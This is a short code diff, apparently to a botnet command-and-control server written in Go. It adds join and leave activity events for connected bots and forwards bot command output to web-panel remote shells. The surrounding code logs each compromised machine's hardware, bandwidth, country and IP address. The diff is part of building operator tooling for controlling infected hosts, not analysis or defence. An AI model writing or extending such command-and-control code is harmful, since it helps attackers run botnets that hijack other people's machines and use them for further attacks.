@@ -285,6 +285,8 @@ func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCo
 
 	logMsg("[☾℣☽] Bot authenticated: %s | Arch: %s | RAM: %dMB | CPU: %d | Proc: %s | Uplink: %.1fMbps | Country: %s | IP: %s | Total: %d",
 		botID, arch, ram, cpuCores, processName, uplinkMbps, country, conn.RemoteAddr(), botCount)
+
+	PushActivity("join", fmt.Sprintf("Bot joined: %s (%s, %s)", botID, arch, country))
 }
 
 // removeBotConnection cleanly removes a bot from all tracking structures
@@ -305,6 +307,8 @@ func removeBotConnection(botID string) {
 
 		// Notify TUI of disconnection
 		LogBotConnection(arch, false)
+
+		PushActivity("leave", fmt.Sprintf("Bot left: %s (%s)", botID, arch))
 
 		// Remove from command origin map (tracks user->bot command routing)
 		originLock.Lock()
@@ -382,6 +386,7 @@ func handleBotConnection(conn net.Conn) {
 				delete(botConnections, botID)
 				botCount--
 				logMsg("[☾℣☽] Bot disconnected: %s (%s)", botID, conn.RemoteAddr())
+				PushActivity("leave", fmt.Sprintf("Bot left: %s (%s)", botID, botConn.arch))
 				break
 			}
 		}
@@ -563,6 +568,9 @@ func handleBotConnection(conn net.Conn) {
 					delete(commandOrigin, botID)
 					originLock.Unlock()
 				}
+
+				// Forward to web panel shells
+				forwardBotOutputToWebShells(botID, output)
 			}
 			continue
 		}
